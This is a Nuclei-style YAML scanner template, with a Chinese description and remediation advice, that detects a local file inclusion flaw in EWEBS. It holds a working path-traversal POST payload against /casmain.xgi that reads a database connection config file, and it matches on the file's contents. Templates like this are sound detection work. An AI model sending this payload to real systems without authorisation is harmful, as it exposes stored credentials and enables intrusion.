id: ewebs-arbitrary-file-reading

info:
  name: EWEBS - 本地文件包含漏洞
  author: pikpikcu
  severity: high
  description: |
    该模板用于检测 EWEBS - 本地文件包含漏洞。该类漏洞通常源于文件路径、下载参数或资源加载接口缺少目录穿越和权限校验，导致任意文件被读取或包含。模板会向 `/casmain.xgi` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可读取配置文件、源码、日志、密钥或系统敏感文件。
    - 若文件包含点可被利用，可能进一步造成代码执行、凭据泄露或对内部系统的持续入侵。
  remediation: |
    - 对文件访问参数使用固定映射或白名单，禁止直接使用用户输入拼接文件路径。
    - 规范化并校验最终路径，阻断 `../`、编码绕过和绝对路径访问。
    - 限制应用进程的文件系统权限，避免配置、密钥和日志被 Web 服务账号读取。
  reference:
    - http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/%E6%9E%81%E9%80%9AEWEBS/%E6%9E%81%E9%80%9AEWEBS%20casmain.xgi%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: ewebs,lfi,vuln

http:
  - method: POST
    path:
      - '{{BaseURL}}/casmain.xgi'

    headers:
      Content-Type: application/x-www-form-urlencoded

    body: "Language_S=../../Data/CONFIG/CasDbCnn.dat"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "[Edition]"
          - "[LocalInfo]"
        condition: and
        part: body

      - type: status
        status:
          - 200
